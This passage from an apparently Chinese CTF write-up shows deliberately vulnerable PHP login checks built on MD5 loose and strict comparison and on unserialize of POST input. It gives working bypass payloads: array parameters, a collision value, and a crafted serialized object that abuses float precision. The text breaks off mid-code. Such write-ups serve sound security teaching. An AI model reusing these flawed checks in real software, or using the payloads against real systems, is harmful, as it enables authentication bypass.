+pass=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP</code></pre><p><img src="/2020/08/23/php-md5-bypass-audit/image-20200826204835947.png" alt="image-20200826204835947"></p>
+<h1 id="MD5-3-若类型-挑战"><a href="#MD5-3-若类型-挑战" class="headerlink" title="MD5-3-若类型-挑战"></a>MD5-3-若类型-挑战</h1><h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!=</span> <span class="token variable">$pass</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>login successful&lt;/br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"login failed!&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"False！！！！！！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Please input the user and pass ！&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Bypass-3"><a href="#Bypass-3" class="headerlink" title="Bypass"></a>Bypass</h2><p>代码核心逻辑在于<code>if ($user != $pass &amp;&amp; md5($user) == md5(md5($pass)))</code>，和上面挑战不同在于MD5校验为单层MD5与双层MD5比较，绕过手段：Null绕过、碰撞科学计数法绕过。</p>
+<ul>
+<li><strong>Null绕过</strong></li>
+</ul>
+<p>通过巧妙的构造Null使得MD5加密值相同，针对逻辑<code>md5($user) == md5(md5($pass))</code>，当<code>$user</code>值为空，<code>$pass</code>为数组则可以巧妙的利用<code>Null</code>进行绕过，分析逻辑如下：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token keyword">Null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">string</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token string">"d41d8cd98f00b204e9800998ecf8427e"</span>
+
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">NULL</span>
+
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">string</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token string">"d41d8cd98f00b204e9800998ecf8427e"</span>
+
+<span class="token function">md5</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>Null</code>特性绕过</p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200826215510564.png" alt="image-20200826215510564"></p>
+<ul>
+<li><strong>碰撞科学计数法绕过</strong></li>
+</ul>
+<p>尝试碰撞寻找二层MD5加密值为科学计数法表示，进行绕过。</p>
+<h1 id="MD5-4-强类型-挑战"><a href="#MD5-4-强类型-挑战" class="headerlink" title="MD5-4-强类型-挑战"></a>MD5-4-强类型-挑战</h1><h2 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!=</span> <span class="token variable">$pass</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>login successful&lt;/br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"login failed!&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"False！！！！！！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Please input the user and pass ！&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Bypass-4"><a href="#Bypass-4" class="headerlink" title="Bypass"></a>Bypass</h2><p>与<code>MD5-3-若类型-挑战</code>相比较，校验逻辑变为强类型，【由于是强类型比较所以无法使用上述碰撞科学计数法】，绕过手法：Null绕过。</p>
+<ul>
+<li><strong>Null绕过</strong></li>
+</ul>
+<p>与<code>MD5-3-若类型-挑战</code>中<code>Null</code>绕过手法原理相同，这里虽然是强类型但最终的<code>Null</code>值MD5皆为字符串类型，同时<code>null</code>值MD5相同</p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200827003442950.png" alt="image-20200827003442950"></p>
+<h1 id="MD5-5-弱类型-挑战"><a href="#MD5-5-弱类型-挑战" class="headerlink" title="MD5-5-弱类型-挑战"></a>MD5-5-弱类型-挑战</h1><h2 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!=</span> <span class="token variable">$pass</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>login successful&lt;/br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"login failed!&lt;br>"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"False！！！！！！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Please input the user and pass ！&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Bypass-5"><a href="#Bypass-5" class="headerlink" title="Bypass"></a>Bypass</h2><p>同理与<code>MD5-3-若类型-挑战</code>相比较，校验多了一个强制转换变量为字符串<code>$user = (string)$_GET[&#39;user&#39;];</code>、<code>$pass = (string)$_GET[&#39;pass&#39;];</code>，导致<code>Null</code>手法无法使用【数组会受到(string)强制转换的影响】，绕过手法：碰撞科学计数法绕过。</p>
+<ul>
+<li><strong>碰撞科学计数法绕过</strong></li>
+</ul>
+<p>尝试碰撞寻找二层MD5加密值为科学计数法表示，进行绕过。</p>
+<h1 id="MD5-6-强类型-挑战"><a href="#MD5-6-强类型-挑战" class="headerlink" title="MD5-6-强类型-挑战"></a>MD5-6-强类型-挑战</h1><h2 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!==</span> <span class="token variable">$pass</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"False！！！！！！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Please input the user and pass ！&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Bypass-6"><a href="#Bypass-6" class="headerlink" title="Bypass"></a>Bypass</h2><p>针对强类型逻辑比较绕过，同弱类型逻辑比较中利用php特性MD5处理数组默认返回<code>Null</code>进行绕过手法原理一样（Null类型强(弱)等于Null类型），绕过手法：数组绕过</p>
+<ul>
+<li><strong>数组绕过</strong></li>
+</ul>
+<pre><code>?user[]=11&amp;pass[]=1</code></pre><p><img src="/2020/08/23/php-md5-bypass-audit/image-20200827005844221.png" alt="image-20200827005844221"></p>
+<h1 id="MD5-7-强类型-挑战"><a href="#MD5-7-强类型-挑战" class="headerlink" title="MD5-7-强类型-挑战"></a>MD5-7-强类型-挑战</h1><h2 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">auth</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"Auth1 False！！！！！！"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span> <span class="token operator">!==</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"Auth2 False！！！！！！"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'auth'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Bypass-7"><a href="#Bypass-7" class="headerlink" title="Bypass"></a>Bypass</h2><p>代码审计分析：反序列化<code>$_POST[&#39;auth&#39;]</code>的序列化数据，当<code>auth</code>对象销毁时触发<code>__destruct</code>魔术方法，<code>__destruct</code>里面的逻辑为，变量长度不能大于3，<code>$this-&gt;user</code>变量强制转换为字符串类型，然后<code>$this-&gt;user</code>和<code>$this-&gt;pass</code>变量进行强弱类型比较，最后变量MD5值要强类型相等。</p>
+<p>通过审计分析，绕过手段：浮点型数据精度绕过、php特定数据类型值绕过。</p>
+<ul>
+<li><strong>浮点型数据精度绕过</strong></li>
+</ul>
+<p>浮点型精度</p>
+<pre><code>永远不要相信浮点数结果精确到了最后一位，也永远不要比较两个浮点数是否相等。如果确实需要更高的精度，应该使用任意精度数学函数或者 gmp 函数。</code></pre><p>部分分析如下</p>
+<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>strlen<span class="token punctuation">(</span>0.400000000000004<span class="token punctuation">))</span><span class="token punctuation">;</span>
+Command line code:1:
+int<span class="token punctuation">(</span>3<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>strlen<span class="token punctuation">(</span>0.400000000000005<span class="token punctuation">))</span><span class="token punctuation">;</span>
+Command line code:1:
+int<span class="token punctuation">(</span>16<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>strlen<span class="token punctuation">(</span>0.4000000000006<span class="token punctuation">))</span><span class="token punctuation">;</span>
+Command line code:1:
+int<span class="token punctuation">(</span>15<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>0.400000000000004<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+double<span class="token punctuation">(</span>0.4<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>0.400000000000006<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+double<span class="token punctuation">(</span>0.40000000000001<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>0.4000000000005<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+double<span class="token punctuation">(</span>0.4000000000005<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>浮点型精度绕过</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">auth</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">}</span>
+
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">auth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token number">0.04</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span> <span class="token operator">=</span> <span class="token number">0.1</span><span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br>\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+auth<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"auth"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>d<span class="token punctuation">:</span><span class="token number">0.4</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"pass"</span><span class="token punctuation">;</span>d<span class="token punctuation">:</span><span class="token number">0.400000000000004</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>分析</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$this</span>-<span class="token operator">></span>user <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span>-<span class="token operator">></span>user<span class="token punctuation">;</span> <span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span><span class="token string">"0.4"</span><span class="token punctuation">)</span>
+<span class="token variable">$this</span>-<span class="token operator">></span>pass <span class="token operator">=</span><span class="token operator">></span> double<span class="token punctuation">(</span>0.4<span class="token punctuation">)</span> 【0.400000000000004】
+
+<span class="token comment" spellcheck="true"># bypass if (strlen($this->user) > 3 || strlen($this->pass) > 3)</span>
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>strlen<span class="token punctuation">(</span>0.400000000000004<span class="token punctuation">))</span><span class="token punctuation">;</span>
+Command line code:1:
+int<span class="token punctuation">(</span>3<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>strlen<span class="token punctuation">(</span>0.4<span class="token punctuation">))</span><span class="token punctuation">;</span>
+Command line code:1:
+int<span class="token punctuation">(</span>3<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># bypass $this->user !== $this->pass 【数据类型不同，逻辑`!==`比较直接为true】</span>
+<span class="token variable">$this</span>-<span class="token operator">></span>user <span class="token operator">=</span><span class="token operator">></span> string <span class="token function">type</span>
+<span class="token variable">$this</span>-<span class="token operator">></span>pass <span class="token operator">=</span><span class="token operator">></span> float <span class="token function">type</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>0.400000000000004<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+double<span class="token punctuation">(</span>0.4<span class="token punctuation">)</span>
+
+λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">((</span>string<span class="token punctuation">)</span>0.4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+Command line code:1:
+string<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token string">"0.4"</span>
+
+<span class="token comment" spellcheck="true"># bypass $this->user != $this->pass 【比较数据值】</span>
+<span class="token comment" spellcheck="true"># 在比较数字或字母的时候通常使用对比法，即从前往后进行按字母位比较</span>
+string<span class="token punctuation">(</span><span class="token string">"0.4"</span><span class="token punctuation">)</span> 和 double<span class="token punctuation">(</span>0.4<span class="token punctuation">)</span> 【0.400000000000004】进行比较时，string<span class="token punctuation">(</span><span class="token string">"0.4"</span><span class="token punctuation">)</span>转换为数字型0.4，然后和 double<span class="token punctuation">(</span>0.4<span class="token punctuation">)</span> 【0.400000000000004】进行比较，即0.400000000000000和0.400000000000004的比较，直观看到：数据值不同，逻辑<span class="token variable"><span class="token variable">`</span><span class="token operator">!=</span><span class="token variable">`</span></span>比较为true
+
+<span class="token comment" spellcheck="true"># bypass md5($this->user) === md5($this->pass)</span>
+浮点型 double<span class="token punctuation">(</span>0.4<span class="token punctuation">)</span> 【0.400000000000004】在进行MD5加密时，实际加密的为0.4，即MD5<span class="token punctuation">(</span>0.4<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>MD5<span class="token punctuation">(</span>0.4<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>效果</p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200827014052979.png" alt="image-20200827014052979"></p>
+<ul>
+<li><strong>php特定数据类型值绕过</strong></li>
+</ul>
+<p>除了使用上述浮点精度解决问题外，也可以使用PHP中比较特殊的两个值进行绕过代码逻辑限制</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">/**
+ * The infinite
+ */</span>
+<span class="token function">define</span> <span class="token punctuation">(</span><span class="token string">'INF'</span><span class="token punctuation">,</span> <span class="token constant">INF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">/**
+ * Not A Number
+ */</span>
